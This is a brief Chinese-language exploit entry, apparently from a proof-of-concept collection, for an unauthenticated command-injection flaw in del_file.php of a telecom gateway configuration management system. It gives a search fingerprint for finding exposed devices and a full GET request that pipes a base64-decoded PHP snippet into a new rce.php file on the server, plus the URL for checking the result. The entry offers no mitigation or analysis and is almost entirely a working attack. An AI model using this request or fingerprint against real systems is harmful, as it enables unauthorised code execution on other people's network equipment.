# 电信网关配置管理系统del_file.php前台RCE漏洞

电信网关配置管理系统del_file.php前台 ｜ 命令执行 ｜ —
- **指纹**：`body="img/login_bg3.png"`
- **请求**：`GET /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=%20%7C%20base64%20-d%20%3E%20rce.php HTTP/1.1`

**Payload**
```
验证URL：/manager/newtpl/rce.php
```